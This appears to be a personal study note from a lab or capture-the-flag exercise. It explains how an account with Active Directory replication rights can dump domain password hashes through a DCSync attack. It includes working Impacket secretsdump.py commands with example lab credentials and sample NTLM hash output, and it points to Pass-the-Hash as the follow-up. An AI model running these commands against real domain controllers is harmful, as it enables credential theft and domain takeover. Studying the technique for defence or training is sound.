
**Purpose:** Dump password hashes from a Domain Controller without directly accessing `NTDS.dit`.

### 1. Backup Account with Replication Permissions

Sometimes an account such as `backup` is given **Active Directory replication permissions**.

These permissions allow the account to request directory changes from the Domain Controller, similar to how a Domain Controller synchronizes AD data with another Domain Controller.

Important replication permissions include:
```text
DS-Replication-Get-Changes
DS-Replication-Get-Changes-All
```

The dangerous part is that these permissions can allow the account to request **password hash data** from the DC.
```text
Backup Account
      │
      │ Replication permissions
      ▼
Domain Controller
      │
      │ Replication data
      ▼
Password hashes
```

**Why does this work?**

Active Directory uses **replication** to synchronize directory information between Domain Controllers. An account with sufficient replication rights can abuse this functionality and request sensitive directory data.

---

### 2. `secretsdump.py`

**Tool:** Impacket `secretsdump.py`
```bash
secretsdump.py '<DOMAIN>/<USER>:<PASSWORD>@<DC-IP>'
```
the tool path --> /home/eyad/.local/share/pipx/venvs/impacket/bin

**Example:**
```bash
secretsdump.py 'spookysec.local/backup:Password123!@10.10.10.10'
```

It can return information such as:

```text
Administrator:500:<LM_HASH>:<NTLM_HASH>:::
backup:1103:<LM_HASH>:<NTLM_HASH>:::
```

The important value is the **NTLM hash**.

### Why does `secretsdump.py` work?

When the account has the required replication privileges, `secretsdump.py` can perform a **DCSync attack** by requesting password-related replication data from the Domain Controller.

It does **not** need to copy `NTDS.dit` directly from disk.

```text
Compromised backup account
          │
          │ Replication rights
          ▼
     DCSync attack
          │
          ▼
Domain Controller
          │
          ▼
Password hashes
          │
          ▼
Administrator NTLM hash
```

### Key Point

> **DCSync abuses Active Directory replication permissions to retrieve password hashes from a Domain Controller.**

**DCSync gets the hash → Pass-the-Hash uses the hash.**